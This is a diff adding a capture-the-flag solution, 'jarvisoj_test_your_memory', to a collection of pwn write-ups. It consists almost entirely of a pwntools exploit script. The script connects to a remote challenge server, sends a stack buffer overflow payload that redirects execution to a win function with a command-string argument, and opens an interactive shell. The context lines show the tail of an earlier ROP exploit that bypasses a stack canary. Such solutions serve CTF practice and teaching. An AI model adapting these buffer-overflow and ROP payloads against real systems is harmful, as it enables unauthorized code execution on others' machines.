@@ -264,3 +264,24 @@ exploit = b'\x11'*(0x20-8) + p64(canary) + b'\x22'*8 + p64(pop_rdi_ret) + p64(bi
 p.sendline(exploit)
 p.interactive()
 ```
+
+### jarvisoj_test_your_memory
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+filename = './memory'
+#p = process(filename)
+p = remote('node3.buuoj.cn', 28369)
+elf = ELF(filename)
+
+cmd_str = 0x080487e0
+func_addr = elf.sym['win_func']
+main_addr = elf.sym['main']
+#p.sendlineafter(b'...', b'a'*(0x13+4) + p32(func_addr) + p32(main_addr) + p32(cmd_str))
+p.send(b'a'*(0x13+4) + p32(func_addr) + p32(main_addr) + p32(cmd_str) + b'\n')
+
+p.interactive()
+```
